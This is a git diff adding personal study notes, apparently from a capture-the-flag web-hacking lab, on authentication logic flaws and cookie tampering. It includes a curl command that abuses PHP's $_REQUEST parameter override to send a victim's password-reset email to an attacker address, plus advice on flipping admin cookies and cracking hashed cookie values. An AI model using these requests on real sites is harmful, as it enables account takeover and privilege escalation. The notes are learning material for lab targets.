@@ -222,6 +222,79 @@ The ffuf tool and wordlist come pre-installed on the AttackBox or can be install
 > AS I HAVE EXPERIENCE BUGS
 > All of the response are 200 
 
+### LOGIC FLAW PRACTICAL 
+
+What is a Logic Flaw?
+
+Sometimes authentication processes contain logic flaws. A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker. Logic flaws can exist in any area of a website, but we're going to concentrate on examples relating to authentication in this instance.
+
+![logic_flaw](./media/5-logic-flaw.png)
+
+
+**Logic Flaw Practical**
+
+Try Reset Password function.
+get the error message. 
+Example: 
+ `If an invalid email is entered, you'll receive the error message "Account not found from supplied email address"`
+
+Now study the frameworks. on how they recieved the request data. 
+Example: 
+in the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable `$_REQUEST`. 
+The PHP `$_REQUEST` variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.
+
+in simple words, `email` variable value  will be overriden if you pass another `email` variable 
+Example:
+
+```
+ curl 'http://10.10.252.240/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
+```
+
+Now I'll create an email to spoof their customer service 
+`{username}@customer.acmeitsupport.thm`
+
+now i ran this command 
+```
+username=jaf
+curl 'http://10.10.252.240/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
+```
+email was sent to my created account, then changed his password there
+
+### COOKIE TAMPERING 
+
+Plain Text
+The contents of some cookies can be in plain text, and it is obvious what they do. Take, for example, if these were the cookie set after a successful login:
+Set-Cookie: logged_in=true; Max-Age=3600; Path=/
+Set-Cookie: admin=false; Max-Age=3600; Path=/
+
+We see one cookie (logged_in), which appears to control whether the user is currently logged in or not, and another (admin), which controls whether the visitor has admin privileges. Using this logic, if we were to change the contents of the cookies and make a request we'll be able to change our privileges.
+
+First, we'll start just by requesting the target page:
+
+Here's an example scenario of modifying the cookie header and gaining access as an admin
+![cookie_tamper](./5-cookie-tamper.png)
+
+
+Hashing
+Sometimes cookie values can look like a long string of random characters; these are called hashes which are an irreversible representation of the original text. Here are some examples that you may come across:
+
+| Original String | Hash Method |                                                              Output                                                              |
+|:---------------:|:-----------:|:--------------------------------------------------------------------------------------------------------------------------------:|
+|        1        |     md5     |                                                 c4ca4238a0b923820dcc509a6f75849b                                                 |
+|        1        |   sha-256   |                                 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b                                 |
+|        1        |   sha-512   | 4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a |
+|        1        |     sha1    |                                             356a192b7913b04c54574d18c28d46e6395428ab                                             |
+
+**ENCODING** is reversible
+most common is base64
+
+**HASHING** is one way process. and cannot be reversed 
+but hashes always stay the same so you can crack them using tools like this 
+`https://crackstation.net`
+
+
+
+
 
 ## IDOR
 
@@ -249,6 +322,8 @@ Content can be many things, a file, video, picture, backup, a website feature.
 - Automated 
 - OSINT (Open-Source Intelligence).
 
+
+**SUBDOMAIN ENUMERATION**
 
 
 
